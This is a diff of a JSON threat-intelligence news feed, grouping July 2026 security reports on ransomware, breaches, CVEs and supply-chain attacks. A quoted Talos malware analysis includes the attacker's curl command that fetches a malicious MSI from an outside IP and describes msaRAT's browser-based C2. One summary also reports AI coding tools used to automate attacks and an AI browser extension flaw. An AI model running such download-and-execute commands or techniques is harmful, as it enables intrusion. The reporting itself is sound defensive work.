+          "summary": "The Chaos ransomware group uses new malware \"msaRAT\" that hijacks browsers. The malware doesn't communicate directly with C2 but connects through the browser. It enables arbitrary command execution while hiding the attacker's IP from victims via WebRTC over TURN.",
+          "taxonomy": {
+            "threat_categories": [
+              "ransomware_extortion",
+              "phishing_social_eng",
+              "data_breach"
+            ],
+            "actor_attribution": [],
+            "affected_industries": [],
+            "affected_products": [
+              "Cisco"
+            ],
+            "tools_used": [],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "urgency_signals": [],
+            "content_type": "news_report",
+            "confidence_tier": "tier_1_primary_research",
+            "role_map": {
+              "Cisco": "target"
+            },
+            "weak_tags": {
+              "products": []
+            }
+          }
+        }
+      ]
+    },
+    {
+      "cluster_id": "2bab6cab95",
+      "priority_score": 10,
+      "member_count": 1,
+      "corroborating_source_count": 1,
+      "strong_signals": [],
+      "taxonomy": {
+        "threat_categories": [
+          "data_breach",
+          "ransomware_extortion",
+          "supply_chain"
+        ],
+        "actor_attribution": [],
+        "affected_industries": [
+          "financial_services",
+          "government",
+          "manufacturing_industrial"
+        ],
+        "affected_products": [
+          "Anthropic/Claude",
+          "Microsoft SharePoint",
+          "WordPress"
+        ],
+        "tools_used": [],
+        "cve_ids": [
+          "CVE-2026-15409",
+          "CVE-2026-56155",
+          "CVE-2026-56164",
+          "CVE-2026-60137",
+          "CVE-2026-63030"
+        ],
+        "attack_techniques": [],
+        "urgency_signals": [
+          "preauth_unauth"
+        ],
+        "content_type": [
+          "news_report"
+        ],
+        "confidence_tier": [
+          "tier_1_primary_research"
+        ]
+      },
+      "primary": {
+        "source": "Check Point Research",
+        "cohort": "threat_research_primary",
+        "title": "20th July – Threat Intelligence Report",
+        "link": "https://research.checkpoint.com/2026/20th-july-threat-intelligence-report/",
+        "published": "2026-07-20T12:18:41+00:00",
+        "summary": "For the latest discoveries in cyber research for the week of 20th July, please download our Threat Intelligence Bulletin. TOP ATTACKS AND BREACHES Ernst & Young, a global accounting and professional services company, has disclosed a data breach involving a compromised third-party IT support platform. The exposed support tickets may have contained client documents, tax information, […] The post 20th July – Threat Intelligence Report appeared first on Check Point Research .",
+        "full_body": "FILTER BY YEAR 2026 2025 2024 2023 2022 2021 2020 2019 2018 2017 2016 20th July – Threat Intelligence Report July 20, 2026 https://research.checkpoint.com/2026/20th-july-threat-intelligence-report/ For the latest discoveries in cyber research for the week of 20th July, please download our Threat Intelligence Bulletin. TOP ATTACKS AND BREACHES Ernst & Young, a global accounting and professional services company, has disclosed a data breach involving a compromised third-party IT support platform. The exposed support tickets may have contained client documents, tax information, employee details, and other sensitive information submitted while requesting technical assistance. Jscrambler, a JavaScript code-protection package with more than 15,000 weekly downloads, has experienced a supply chain compromise after stolen npm publishing credentials distributed malicious releases. The packages deployed malware targeting developers’, cloud, browser, cryptocurrency, and messaging credentials. Jscrambler removed the affected versions. Coca-Cola’s US dairy subsidiary Fairlife has confirmed a ransomware attack that temporarily halted production across the United States. Attackers accessed systems supporting manufacturing operations, prompting the company to activate incident response and business continuity procedures. Coca-Cola has not confirmed whether data was exfiltrated in the attack. Nihon Kotsu, Japan’s largest taxi operator, has suffered a malware attack following unauthorized access to its internal network. The company shut down affected systems, disrupting taxi dispatches, telephone services, bookings, reservations, and car rentals from July 11. No theft of customer or corporate information has been confirmed. AI THREATS Researchers identified a China-linked campaign that used Claude Code and DeepSeek to automate attacks against government and financial organizations. The tools generated scripts, adapted failed exploits, created credential-harvesting pages, and executed commands. Confirmed compromises affected government systems in Thailand and Afghanistan and organizations in Taiwan. Researchers found that xAI’s Grok Build coding assistant could upload entire Git repositories while processing debugging requests. Transferred information included unopened files and complete commit histories, potentially exposing API keys, credentials, and proprietary source code. Initial privacy controls did not prevent uploads until a server-side restriction was introduced. Researchers verified a weakness in Anthropic’s Claude for Chrome extension that allowed malicious browser extensions to impersonate Claude and act through authenticated user sessions. Successful exploitation could expose Gmail, Google Drive, or GitHub information through Claude’s permissions. Anthropic released fixes, although researchers reported that a bypass remained possible. VULNERABILITIES AND PATCHES Microsoft released patches for 622 vulnerabilities in July’s Patch Tuesday, the largest monthly release recorded by the company. Two vulnerabilities were under active exploitation, including CVE-2026-56164 in SharePoint Server and CVE-2026-56155 in Active Directory Federation Services. Both vulnerabilities could allow attackers to elevate privileges. Check Point IPS provides protection against these threats (Microsoft SharePoint Authentication Bypass (CVE-2026-56164)) WordPress has issued emergency updates for CVE-2026-63030 and CVE-2026-60137, collectively called wp2shell. The critical WordPress Core vulnerabilities allow unauthenticated remote code execution and website takeover. Affected releases include versions 6.9.0 through 6.9.4 and 7.0.0 through 7.0.1. Fixed versions include 6.9.5 and 7.0.2. Check Point IPS provides protection against these threats (WordPress Authentication Bypass (CVE-2026-63030)), WordPress SQL Injection (CVE-2026-60137)) SonicWall has released a hotfix for CVE-2026-15409 and CVE-2026-15410, two critical vulnerabilities affecting SMA 1000 Series gat",
+        "fetch_status": "ok",
+        "taxonomy": {
+          "threat_categories": [
+            "ransomware_extortion",
+            "supply_chain",
+            "data_breach"
+          ],
+          "actor_attribution": [],
+          "affected_industries": [
+            "financial_services",
+            "government",
+            "manufacturing_industrial"
+          ],
+          "affected_products": [
+            "Anthropic/Claude",
+            "Microsoft SharePoint",
+            "WordPress"
+          ],
+          "tools_used": [],
+          "cve_ids": [
+            "CVE-2026-56164",
+            "CVE-2026-56155",
+            "CVE-2026-63030",
+            "CVE-2026-60137",
+            "CVE-2026-15409"
+          ],
+          "attack_techniques": [],
+          "urgency_signals": [
+            "preauth_unauth"
+          ],
+          "content_type": "news_report",
+          "confidence_tier": "tier_1_primary_research",
+          "role_map": {
+            "Anthropic/Claude": "target",
+            "Microsoft SharePoint": "target",
+            "WordPress": "target",
+            "SonicWall": "target",
+            "npm": "target",
+            "GitHub": "target"
+          },
+          "weak_tags": {
+            "products": []
+          }
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "Check Point Research",
+          "cohort": "threat_research_primary",
+          "title": "20th July – Threat Intelligence Report",
+          "link": "https://research.checkpoint.com/2026/20th-july-threat-intelligence-report/",
+          "published": "2026-07-20T12:18:41+00:00",
+          "summary": "For the latest discoveries in cyber research for the week of 20th July, please download our Threat Intelligence Bulletin. TOP ATTACKS AND BREACHES Ernst & Young, a global accounting and professional services company, has disclosed a data breach involving a compromised third-party IT support platform. The exposed support tickets may have contained client documents, tax information, […] The post 20th July – Threat Intelligence Report appeared first on Check Point Research .",
+          "taxonomy": {
+            "threat_categories": [
+              "ransomware_extortion",
+              "supply_chain",
+              "data_breach"
+            ],
+            "actor_attribution": [],
+            "affected_industries": [
+              "financial_services",
+              "government",
+              "manufacturing_industrial"
+            ],
+            "affected_products": [
+              "Anthropic/Claude",
+              "Microsoft SharePoint",
+              "WordPress"
+            ],
+            "tools_used": [],
+            "cve_ids": [
+              "CVE-2026-56164",
+              "CVE-2026-56155",
+              "CVE-2026-63030",
+              "CVE-2026-60137",
+              "CVE-2026-15409"
+            ],
+            "attack_techniques": [],
+            "urgency_signals": [
+              "preauth_unauth"
+            ],
+            "content_type": "news_report",
+            "confidence_tier": "tier_1_primary_research",
+            "role_map": {
+              "Anthropic/Claude": "target",
+              "Microsoft SharePoint": "target",
+              "WordPress": "target",
+              "SonicWall": "target",
+              "npm": "target",
+              "GitHub": "target"
+            },
             "weak_tags": {
               "products": []
             }
@@ -4650,252 +4919,6 @@
       ]
     },
     {
-      "cluster_id": "a1940e8772",
-      "priority_score": 10,
-      "member_count": 1,
-      "corroborating_source_count": 1,
-      "strong_signals": [],
-      "taxonomy": {
-        "threat_categories": [
-          "data_breach",
-          "phishing_social_eng",
-          "ransomware_extortion"
-        ],
-        "actor_attribution": [],
-        "affected_industries": [],
-        "affected_products": [
-          "Cisco"
-        ],
-        "tools_used": [],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "urgency_signals": [],
-        "content_type": [
-          "news_report"
-        ],
-        "confidence_tier": [
-          "tier_1_primary_research"
-        ]
-      },
-      "primary": {
-        "source": "Cisco Talos",
-        "cohort": "threat_research_primary",
-        "title": "Chaos ransomware's msaRAT: Living off the browser to build a covert C2 channel",
-        "link": "https://blog.talosintelligence.com/chaos-msarat-living-off-the-browser-to-build-covert-c2-channel/",
-        "published": "2026-07-23T10:00:38+00:00",
-        "summary": "The Chaos ransomware group uses new malware \"msaRAT\" that hijacks browsers. The malware doesn't communicate directly with C2 but connects through the browser. It enables arbitrary command execution while hiding the attacker's IP from victims via WebRTC over TURN.",
-        "full_body": "Chaos ransomware's msaRAT: Living off the browser to build a covert C2 channel By Jordyn Dunk , Michael Szeliga , Takahiro Takeda Thursday, July 23, 2026 06:00 ransomware RAT Cisco Talos has discovered a new Rust-based remote access trojan (RAT) we call “msaRAT” attributed to the Chaos ransomware group. The name is derived from the binding names found in the binary: “msaOpen,” “msaClose,” “msaError,” and “msaMessage”. msaRAT is implemented using the Tokio asynchronous runtime, with primary capabilities of browser-leveraged remote code execution and covert tunneling to establish command-and-control (C2) communications. This RAT never touches the network directly — it controls its C2 communication channel exclusively through Chrome DevTools Protocol (CDP), a browser debugging API. The binary contains a Cloudflare Workers endpoint, but it never makes HTTP connections to that domain itself; it offloads that work entirely to the browser. msaRAT manipulates the browser via CDP, performs signaling (SDP Offer/Answer exchange) with Cloudflare Workers, and establishes a WebRTC DataChannel between the browser and the C2 server using Twilio TURN (Traversal Using Relays around NAT) as a relay. Overview of Chaos ransomware Chaos is a ransomware-as-a-service (RaaS) group whose activity was first confirmed in February 2025. Although the number of listings on their data leak site remains relatively low, the group consistently targets large organizations and employs double extortion tactics. For initial access, they rely on spam emails and voice-based social engineering, commonly known as vishing. Once inside a network, their traditional post-compromise methodology involves abusing remote monitoring and management (RMM) tools to establish persistent access, while leveraging legitimate file-sharing software to exfiltrate data. For a detailed breakdown of their tactics, techniques, and procedures (TTPs), please refer to our previous blog. Figure 1. Chaos ransomware leak site. Infection chain Talos has identified a new Rust-based RAT used by the Chaos ransomware group, which we have named msaRAT. The name is derived from the binding names found in the binary (“msaOpen,” “msaClose,” “msaError,” “msaMessage”), as detailed in a later section. Figure 2 illustrates the end-to-end infection chain, from initial compromise through to the establishment of C2 communications via this RAT. Figure 2. Infection chain. After gaining access to a victim machine but prior to executing the ransomware, the attacker runs the following curl command to download an MSI file named “update_ms.msi” from an attacker-controlled server to the ProgramData directory on the victim machine, then executes it. Although port 443 is specified, the communication occurs over plain HTTP. In environments where firewall rules permit traffic based solely on port number without protocol inspection, this traffic will pass through undetected. curl.exe http://172.86.126.18:443/update_ms.msi -o C:\\programdata\\update_ms.msi The property information of this installer, which extracts the DLL file containing the RAT payload, contains details configured to impersonate a Windows update. Figure 3. Properties of “update_ms.msi” When this MSI file is executed, the custom action CA_Run_EA2AEBC3 is triggered upon completion of InstallFinalize . This custom action loads lib.dll, embedded in the MSI file's Binary table as Bin_lib_EA2AEBC3 , directly into memory. Figure 4. Structure of the MSI file. lib.dll (msaRAT) msaRAT is written in Rust and implemented using the asynchronous runtime Tokio. Its primary capabilities include browser-leveraged reverse shell and covert tunneling to establish communications with a C2 server. The export table of “lib.dll” exposes a function named RUN , which is designed to be called by the installer described above. Based on the actual logs, after downloading this malware, we have confirmed the existence of a ransom note. Tokio runtime initialization Tokio is a runtime for exec",
-        "fetch_status": "ok",
-        "taxonomy": {
-          "threat_categories": [
-            "ransomware_extortion",
-            "phishing_social_eng",
-            "data_breach"
-          ],
-          "actor_attribution": [],
-          "affected_industries": [],
-          "affected_products": [
-            "Cisco"
-          ],
-          "tools_used": [],
-          "cve_ids": [],
-          "attack_techniques": [],
-          "urgency_signals": [],
-          "content_type": "news_report",
-          "confidence_tier": "tier_1_primary_research",
-          "role_map": {
-            "Cisco": "target"
-          },
-          "weak_tags": {
-            "products": []
-          }
-        }
-      },
-      "corroborating_sources": [
-        {
-          "source": "Cisco Talos",
-          "cohort": "threat_research_primary",
-          "title": "Chaos ransomware's msaRAT: Living off the browser to build a covert C2 channel",
-          "link": "https://blog.talosintelligence.com/chaos-msarat-living-off-the-browser-to-build-covert-c2-channel/",
-          "published": "2026-07-23T10:00:38+00:00",
-          "summary": "The Chaos ransomware group uses new malware \"msaRAT\" that hijacks browsers. The malware doesn't communicate directly with C2 but connects through the browser. It enables arbitrary command execution while hiding the attacker's IP from victims via WebRTC over TURN.",
-          "taxonomy": {
-            "threat_categories": [
-              "ransomware_extortion",
-              "phishing_social_eng",
-              "data_breach"
-            ],
-            "actor_attribution": [],
-            "affected_industries": [],
-            "affected_products": [
-              "Cisco"
-            ],
-            "tools_used": [],
-            "cve_ids": [],
-            "attack_techniques": [],
-            "urgency_signals": [],
-            "content_type": "news_report",
-            "confidence_tier": "tier_1_primary_research",
-            "role_map": {
-              "Cisco": "target"
-            },
-            "weak_tags": {
-              "products": []
-            }
-          }
-        }
-      ]
-    },
-    {
-      "cluster_id": "2bab6cab95",
-      "priority_score": 10,
-      "member_count": 1,
-      "corroborating_source_count": 1,
-      "strong_signals": [],
-      "taxonomy": {
-        "threat_categories": [
-          "data_breach",
-          "ransomware_extortion",
-          "supply_chain"
-        ],
-        "actor_attribution": [],
-        "affected_industries": [
-          "financial_services",
-          "government",
-          "manufacturing_industrial"
-        ],
-        "affected_products": [
-          "Anthropic/Claude",
-          "Microsoft SharePoint",
-          "WordPress"
-        ],
-        "tools_used": [],
-        "cve_ids": [
-          "CVE-2026-15409",
-          "CVE-2026-56155",
-          "CVE-2026-56164",
-          "CVE-2026-60137",
-          "CVE-2026-63030"
-        ],
-        "attack_techniques": [],
-        "urgency_signals": [
-          "preauth_unauth"
-        ],
-        "content_type": [
-          "news_report"
-        ],
-        "confidence_tier": [
-          "tier_1_primary_research"
-        ]
-      },
-      "primary": {
-        "source": "Check Point Research",
-        "cohort": "threat_research_primary",
-        "title": "20th July – Threat Intelligence Report",
-        "link": "https://research.checkpoint.com/2026/20th-july-threat-intelligence-report/",
-        "published": "2026-07-20T12:18:41+00:00",
-        "summary": "For the latest discoveries in cyber research for the week of 20th July, please download our Threat Intelligence Bulletin. TOP ATTACKS AND BREACHES Ernst & Young, a global accounting and professional services company, has disclosed a data breach involving a compromised third-party IT support platform. The exposed support tickets may have contained client documents, tax information, […] The post 20th July – Threat Intelligence Report appeared first on Check Point Research .",
-        "full_body": "FILTER BY YEAR 2026 2025 2024 2023 2022 2021 2020 2019 2018 2017 2016 20th July – Threat Intelligence Report July 20, 2026 https://research.checkpoint.com/2026/20th-july-threat-intelligence-report/ For the latest discoveries in cyber research for the week of 20th July, please download our Threat Intelligence Bulletin. TOP ATTACKS AND BREACHES Ernst & Young, a global accounting and professional services company, has disclosed a data breach involving a compromised third-party IT support platform. The exposed support tickets may have contained client documents, tax information, employee details, and other sensitive information submitted while requesting technical assistance. Jscrambler, a JavaScript code-protection package with more than 15,000 weekly downloads, has experienced a supply chain compromise after stolen npm publishing credentials distributed malicious releases. The packages deployed malware targeting developers’, cloud, browser, cryptocurrency, and messaging credentials. Jscrambler removed the affected versions. Coca-Cola’s US dairy subsidiary Fairlife has confirmed a ransomware attack that temporarily halted production across the United States. Attackers accessed systems supporting manufacturing operations, prompting the company to activate incident response and business continuity procedures. Coca-Cola has not confirmed whether data was exfiltrated in the attack. Nihon Kotsu, Japan’s largest taxi operator, has suffered a malware attack following unauthorized access to its internal network. The company shut down affected systems, disrupting taxi dispatches, telephone services, bookings, reservations, and car rentals from July 11. No theft of customer or corporate information has been confirmed. AI THREATS Researchers identified a China-linked campaign that used Claude Code and DeepSeek to automate attacks against government and financial organizations. The tools generated scripts, adapted failed exploits, created credential-harvesting pages, and executed commands. Confirmed compromises affected government systems in Thailand and Afghanistan and organizations in Taiwan. Researchers found that xAI’s Grok Build coding assistant could upload entire Git repositories while processing debugging requests. Transferred information included unopened files and complete commit histories, potentially exposing API keys, credentials, and proprietary source code. Initial privacy controls did not prevent uploads until a server-side restriction was introduced. Researchers verified a weakness in Anthropic’s Claude for Chrome extension that allowed malicious browser extensions to impersonate Claude and act through authenticated user sessions. Successful exploitation could expose Gmail, Google Drive, or GitHub information through Claude’s permissions. Anthropic released fixes, although researchers reported that a bypass remained possible. VULNERABILITIES AND PATCHES Microsoft released patches for 622 vulnerabilities in July’s Patch Tuesday, the largest monthly release recorded by the company. Two vulnerabilities were under active exploitation, including CVE-2026-56164 in SharePoint Server and CVE-2026-56155 in Active Directory Federation Services. Both vulnerabilities could allow attackers to elevate privileges. Check Point IPS provides protection against these threats (Microsoft SharePoint Authentication Bypass (CVE-2026-56164)) WordPress has issued emergency updates for CVE-2026-63030 and CVE-2026-60137, collectively called wp2shell. The critical WordPress Core vulnerabilities allow unauthenticated remote code execution and website takeover. Affected releases include versions 6.9.0 through 6.9.4 and 7.0.0 through 7.0.1. Fixed versions include 6.9.5 and 7.0.2. Check Point IPS provides protection against these threats (WordPress Authentication Bypass (CVE-2026-63030)), WordPress SQL Injection (CVE-2026-60137)) SonicWall has released a hotfix for CVE-2026-15409 and CVE-2026-15410, two critical vulnerabilities affecting SMA 1000 Series gat",
-        "fetch_status": "ok",
-        "taxonomy": {
-          "threat_categories": [
-            "ransomware_extortion",
-            "supply_chain",
-            "data_breach"
-          ],
-          "actor_attribution": [],
-          "affected_industries": [
-            "financial_services",
-            "government",
-            "manufacturing_industrial"
-          ],
-          "affected_products": [
-            "Anthropic/Claude",
-            "Microsoft SharePoint",
-            "WordPress"
-          ],
-          "tools_used": [],
-          "cve_ids": [
-            "CVE-2026-56164",
-            "CVE-2026-56155",
-            "CVE-2026-63030",
-            "CVE-2026-60137",
-            "CVE-2026-15409"
-          ],
-          "attack_techniques": [],
-          "urgency_signals": [
-            "preauth_unauth"
-          ],
-          "content_type": "news_report",
-          "confidence_tier": "tier_1_primary_research",
-          "role_map": {
-            "Anthropic/Claude": "target",
-            "Microsoft SharePoint": "target",
-            "WordPress": "target",
-            "SonicWall": "target",
-            "npm": "target",
-            "GitHub": "target"
-          },
-          "weak_tags": {
-            "products": []
-          }
-        }
-      },
-      "corroborating_sources": [
-        {
-          "source": "Check Point Research",
-          "cohort": "threat_research_primary",
-          "title": "20th July – Threat Intelligence Report",
-          "link": "https://research.checkpoint.com/2026/20th-july-threat-intelligence-report/",
-          "published": "2026-07-20T12:18:41+00:00",
-          "summary": "For the latest discoveries in cyber research for the week of 20th July, please download our Threat Intelligence Bulletin. TOP ATTACKS AND BREACHES Ernst & Young, a global accounting and professional services company, has disclosed a data breach involving a compromised third-party IT support platform. The exposed support tickets may have contained client documents, tax information, […] The post 20th July – Threat Intelligence Report appeared first on Check Point Research .",
-          "taxonomy": {
-            "threat_categories": [
-              "ransomware_extortion",
-              "supply_chain",
-              "data_breach"
-            ],
-            "actor_attribution": [],
-            "affected_industries": [
-              "financial_services",
-              "government",
-              "manufacturing_industrial"
-            ],
-            "affected_products": [
-              "Anthropic/Claude",
-              "Microsoft SharePoint",
-              "WordPress"
-            ],
-            "tools_used": [],
-            "cve_ids": [
-              "CVE-2026-56164",
-              "CVE-2026-56155",
-              "CVE-2026-63030",
-              "CVE-2026-60137",
-              "CVE-2026-15409"
-            ],
-            "attack_techniques": [],
-            "urgency_signals": [
-              "preauth_unauth"
-            ],
-            "content_type": "news_report",
-            "confidence_tier": "tier_1_primary_research",
-            "role_map": {
-              "Anthropic/Claude": "target",
-              "Microsoft SharePoint": "target",
-              "WordPress": "target",
-              "SonicWall": "target",
-              "npm": "target",
-              "GitHub": "target"
-            },
-            "weak_tags": {
-              "products": []
-            }
-          }
-        }
-      ]
-    },
-    {
       "cluster_id": "75f4c3d8b0",
       "priority_score": 10,
       "member_count": 1,
@@ -5101,129 +5124,6 @@
             "confidence_tier": "tier_4_news",
             "role_map": {
               "Docker": "target"
-            },
-            "weak_tags": {
-              "products": []
-            }
-          }
-        }
-      ]
-    },
-    {
-      "cluster_id": "1186a44566",
-      "priority_score": 10,
-      "member_count": 3,
-      "corroborating_source_count": 2,
-      "strong_signals": [
-        "GitHub"
-      ],
-      "taxonomy": {
-        "threat_categories": [],
-        "actor_attribution": [],
-        "affected_industries": [],
-        "affected_products": [
-          "GitHub",
-          "Packagist",
-          "cPanel"
-        ],
-        "tools_used": [],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "urgency_signals": [],
-        "content_type": [
-          "news_report",
-          "vulnerability_disclosure"
-        ],
-        "confidence_tier": [
-          "tier_4_news",
-          "tier_5_chatter"
-        ]
-      },
-      "primary": {
-        "source": "Reddit r/netsec",
-        "cohort": "reddit_practitioner_osint",
-        "title": "GitHub issues $100,000 bounty for critical RCE vulnerability",
-        "link": "https://www.reddit.com/r/netsec/comments/1v3v5za/github_issues_100000_bounty_for_critical_rce/",
-        "published": "2026-07-22T22:21:24+00:00",
-        "summary": "submitted by /u/ryanmerket [link] [comments]",
-        "full_body": "",
-        "fetch_status": "fetch_failed:HTTPError",
-        "taxonomy": {
-          "threat_categories": [],
-          "actor_attribution": [],
-          "affected_industries": [],
-          "affected_products": [
-            "GitHub"
-          ],
-          "tools_used": [],
-          "cve_ids": [],
-          "attack_techniques": [],
-          "urgency_signals": [],
-          "content_type": "vulnerability_disclosure",
-          "confidence_tier": "tier_5_chatter",
-          "role_map": {
-            "GitHub": "target"
-          },
-          "weak_tags": {
-            "products": []
-          }
-        }
-      },
-      "corroborating_sources": [
-        {
-          "source": "Reddit r/netsec",
-          "cohort": "reddit_practitioner_osint",
-          "title": "GitHub issues $100,000 bounty for critical RCE vulnerability",
-          "link": "https://www.reddit.com/r/netsec/comments/1v3v5za/github_issues_100000_bounty_for_critical_rce/",
-          "published": "2026-07-22T22:21:24+00:00",
-          "summary": "submitted by /u/ryanmerket [link] [comments]",
-          "taxonomy": {
-            "threat_categories": [],
-            "actor_attribution": [],
-            "affected_industries": [],
-            "affected_products": [
-              "GitHub"
-            ],
-            "tools_used": [],
-            "cve_ids": [],
-            "attack_techniques": [],
-            "urgency_signals": [],
-            "content_type": "vulnerability_disclosure",
-            "confidence_tier": "tier_5_chatter",
-            "role_map": {
-              "GitHub": "target"
-            },
-            "weak_tags": {
-              "products": []
-            }
-          }
-        },
-        {
-          "source": "The Hacker News",
-          "cohort": "cyber_news_breach_reporting",
-          "title": "Attackers Weaponize GitHub Actions Runners to Target cPanel and WHM Servers",
-          "link": "https://thehackernews.com/2026/07/attackers-weaponize-github-actions.html",
-          "published": "2026-07-23T11:28:54+00:00",
-          "summary": "Cybersecurity researchers have shed light on a large-scale campaign that has turned compromised GitHub repositories into distributed attack infrastructure designed to target cPanel and WebHost Manager (WHM) instances. The activity involves malicious Packagist development versions spanning 10 packages associated with a legitimate PHP and DevOps developer, dinushchathurya, between July 12 and 13,",
-          "taxonomy": {
-            "threat_categories": [],
-            "actor_attribution": [],
-            "affected_industries": [],
-            "affected_products": [
-              "GitHub",
-              "cPanel",
-              "Packagist"
-            ],
-            "tools_used": [],
-            "cve_ids": [],
-            "attack_techniques": [],
-            "urgency_signals": [],
-            "content_type": "news_report",
-            "confidence_tier": "tier_4_news",
-            "role_map": {
-              "GitHub": "target",
-              "cPanel": "target",
-              "Packagist": "target"
             },
             "weak_tags": {
               "products": []
@@ -5905,90 +5805,6 @@
             "affected_industries": [
               "financial_services"
             ],
-            "affected_products": [],
-            "tools_used": [],
-            "cve_ids": [],
-            "attack_techniques": [],
-            "urgency_signals": [],
-            "content_type": "incident_report",
-            "confidence_tier": "tier_4_news",
-            "role_map": {},
-            "weak_tags": {
-              "products": []
-            }
-          }
-        }
-      ]
-    },
-    {
-      "cluster_id": "d3be89f12a",
-      "priority_score": 9,
-      "member_count": 1,
-      "corroborating_source_count": 1,
-      "strong_signals": [],
-      "taxonomy": {
-        "threat_categories": [
-          "credential_theft",
-          "data_breach"
-        ],
-        "actor_attribution": [],
-        "affected_industries": [],
-        "affected_products": [],
-        "tools_used": [],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "urgency_signals": [],
-        "content_type": [
-          "incident_report"
-        ],
-        "confidence_tier": [
-          "tier_4_news"
-        ]
-      },
-      "primary": {
-        "source": "BleepingComputer",
-        "cohort": "cyber_news_breach_reporting",
-        "title": "Chick-fil-A data breach affects more than 13,000 customers",
-        "link": "https://www.bleepingcomputer.com/news/security/chick-fil-a-data-breach-affects-more-than-13-000-customers/",
-        "published": "2026-07-24T14:04:29+00:00",
-        "summary": "Chick-fil-A has confirmed that over 13,000 customers had their accounts breached in a wave of credential stuffing attacks targeting its website and mobile app between June 17 and June 19. [...]",
-        "full_body": "Chick-fil-A data breach affects more than 13,000 customers By Sergiu Gatlan July 24, 2026 10:04 AM 0 American fast food restaurant chain Chick-fil-A has confirmed that over 13,000 customers had their data stolen in a recent wave of credential stuffing attacks. As BleepingComputer first reported , the company revealed in data breach notification letters filed with multiple attorney general's offices that it detected attacks targeting its website and mobile app between June 17 and June 19 after identifying suspicious login activity to certain Chick-fil-A One accounts. Chick-fil-A says the attackers used automated tools and credentials \"obtained from a third-party source\" to hack into Chick-fil-A One accounts and steal customer data. \"We recently identified a security incident that may have affected a limited number of Chick-fil-A One Loyalty accounts. Upon discovering the issue, we took steps to immediately address, secure and restore accounts, and we are communicating directly with all customers who may have been impacted,\" the company told BleepingComputer. During the attacks, the threat actors accessed a combination of customers' names, email addresses, Chick-fil-A One membership numbers, the amount of Chick-fil-A credit, the mobile pay numbers, and the last four digits of the credit/debit card number. Additionally, they may have also gained access to birth dates, phone numbers, and addresses if stored in the compromised accounts. While the company didn't say how many individuals had their data exposed, Chick-fil-A notes in a filing shared by the Office of the Maine Attorney General with BleepingComputer on Wednesday that the resulting data breach affected 13,322 people in total. In separate filings, it also told the Texas attorney general's office the data breach impacts 2182 Texans and the Massachusetts AG that it affects 39 residents . Chick-fil-A has also sent data breach notification letters to residents of the District of Columbia, Iowa, Maryland, New Mexico, New York, North Carolina, Oregon, Vermont, and Rhode Island. In response to the incident, Chick-fil-A says it logged out all impacted accounts, removed payment methods, restored all affected Chick-fil-A One account balances, and has also added rewards to affected accounts as a way of apologizing. Since the accounts were compromised because they were using credentials stolen from third-party services, Chick-fil-A also advised impacted customers to change their passwords as soon as possible. Chick-fil-A also disclosed in March 2023 that hackers stole the personal information of over 71,000 customers after hacking their accounts in another series of credential stuffing attacks between December 2022 and February 2023. As one of the largest fast food companies in the United States, Chick-fil-A operates a network of over 3,000 restaurants across the U.S., Canada, Puerto Rico, the United Kingdom, and Singapore. Test every layer before attackers do Security teams log 54% of successful attacks and alert on just 14%. The rest move through your environment unseen. The Picus whitepaper shows how breach and attack simulation tests your SIEM and EDR rules so threats stop slipping by detection. Get the whitepaper Related Articles: Chick-fil-A discloses data breach after credential stuffing attacks AssuranceAmerica data breach exposes records of 6.9 million drivers 23andMe to pay $18 million in new genetics data breach settlement Lidl discloses online shop breach after service provider hack DHS confirms hackers breached HSIN info-sharing platform",
-        "fetch_status": "ok",
-        "taxonomy": {
-          "threat_categories": [
-            "credential_theft",
-            "data_breach"
-          ],
-          "actor_attribution": [],
-          "affected_industries": [],
-          "affected_products": [],
-          "tools_used": [],
-          "cve_ids": [],
-          "attack_techniques": [],
-          "urgency_signals": [],
-          "content_type": "incident_report",
-          "confidence_tier": "tier_4_news",
-          "role_map": {},
-          "weak_tags": {
-            "products": []
-          }
-        }
-      },
-      "corroborating_sources": [
-        {
-          "source": "BleepingComputer",
-          "cohort": "cyber_news_breach_reporting",
-          "title": "Chick-fil-A data breach affects more than 13,000 customers",
-          "link": "https://www.bleepingcomputer.com/news/security/chick-fil-a-data-breach-affects-more-than-13-000-customers/",
-          "published": "2026-07-24T14:04:29+00:00",
-          "summary": "Chick-fil-A has confirmed that over 13,000 customers had their accounts breached in a wave of credential stuffing attacks targeting its website and mobile app between June 17 and June 19. [...]",
-          "taxonomy": {
-            "threat_categories": [
-              "credential_theft",
-              "data_breach"
-            ],
-            "actor_attribution": [],
-            "affected_industries": [],
             "affected_products": [],
             "tools_used": [],
             "cve_ids": [],
@@ -6880,6 +6696,186 @@
       ]
     },
     {
+      "cluster_id": "38eb29d9d7",
+      "priority_score": 8,
+      "member_count": 1,
+      "corroborating_source_count": 1,
+      "strong_signals": [],
+      "taxonomy": {
+        "threat_categories": [
+          "data_breach"
+        ],
+        "actor_attribution": [],
+        "affected_industries": [
+          "critical_infrastructure",
+          "financial_services",
+          "government",
+          "healthcare"
+        ],
+        "affected_products": [],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": [
+          "incident_report"
+        ],
+        "confidence_tier": [
+          "tier_4_news"
+        ]
+      },
+      "primary": {
+        "source": "The Record",
+        "cohort": "cyber_news_breach_reporting",
+        "title": "Major Australian energy supplier confirms customer data compromised",
+        "link": "https://therecord.media/australia-origin-energy-data-breach",
+        "published": "2026-07-23T13:20:00+00:00",
+        "summary": "Origin Energy said it was working to figure out how many Australians were affected by a recent data breach.",
+        "full_body": "A bird on barbed wire near electricity infrastructure in Adelaide, Australia. Image: Cameron Raynes via Unsplash Major Australian energy supplier confirms customer data compromised An Australian energy company serving nearly 5 million customers announced Thursday that it suffered a data breach and that it is working with federal agencies to investigate. On Wednesday, Sydney-based Origin Energy had said in a brief announcement that it was “investigating a potential security incident” after the news outlet The Australian reported that a purported hacker had sent what they claimed to be a sample of stolen records from the company. In a second update , Origin confirmed that customer data had been compromised and that it is “working to understand the total number of impacted customers.” The data may include account information, the last four digits of credit card numbers and last three digits of bank account numbers, as well as names, addresses and dates of birth. Origin CEO Frank Calabria apologized to customers. “One of our key priorities is taking action to secure our systems and ensure no further unauthorised access,” he said. “We are working with independent cyber experts to support Origin, and that work is continuing alongside the work of authorities.” The breach of Australia’s largest electricity and gas retailer follows the recent compromise of sensitive medical data belonging to a major Australian network of healthcare clinics. Partnered Health confirmed that patients who visited at 